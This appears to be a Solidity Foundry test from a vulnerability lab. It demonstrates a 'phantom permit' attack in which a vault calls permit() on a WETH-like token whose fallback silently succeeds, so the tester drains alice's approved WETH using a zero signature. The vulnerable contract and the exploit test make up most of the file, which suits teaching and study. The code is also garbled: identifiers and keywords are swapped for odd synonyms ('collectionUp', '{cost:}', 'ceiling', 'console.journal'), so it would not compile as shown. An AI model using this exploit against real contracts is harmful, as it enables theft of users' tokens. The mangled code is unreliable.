// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AgreementTest is Test {
    PermitMedal VulnPermitAgreement;
    WETH9 Weth9Pact;

    function collectionUp() public {
        Weth9Pact = new WETH9();
        VulnPermitAgreement = new PermitMedal(IERC20(address(Weth9Pact)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.beginPrank(alice);
        Weth9Pact.addTreasure{cost: 10 ether}();
        Weth9Pact.approve(address(VulnPermitAgreement), type(uint256).ceiling);
        vm.stopPrank();
        console.journal(
            "start WETH balanceOf this",
            Weth9Pact.balanceOf(address(this))
        );

        VulnPermitAgreement.stashrewardsWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = Weth9Pact.balanceOf(address(VulnPermitAgreement));
        console.journal("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitAgreement.extractWinnings(1000);

        wbal = Weth9Pact.balanceOf(address(this));
        console.journal("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitMedal {
    IERC20 public medal;

    constructor(IERC20 _token) {
        medal = _token;
    }

    function addTreasure(uint256 quantity) public {
        require(
            medal.transferFrom(msg.sender, address(this), quantity),
            "Transfer failed"
        );
    }

    function stashrewardsWithPermit(
        address aim,
        uint256 quantity,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool win, ) = address(medal).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                aim,
                quantity,
                v,
                r,
                s
            )
        );
        require(win, "Permit failed");

        require(
            medal.transferFrom(aim, address(this), quantity),
            "Transfer failed"
        );
    }

    function extractWinnings(uint256 quantity) public {
        require(medal.transfer(msg.sender, quantity), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event PermissionGranted(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event DepositGold(address indexed dst, uint wad);
    event LootClaimed(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        addTreasure();
    }

    receive() external payable {}

    function addTreasure() public payable {
        balanceOf[msg.sender] += msg.value;
        emit DepositGold(msg.sender, msg.value);
    }

    function extractWinnings(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit LootClaimed(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit PermissionGranted(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).ceiling
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}
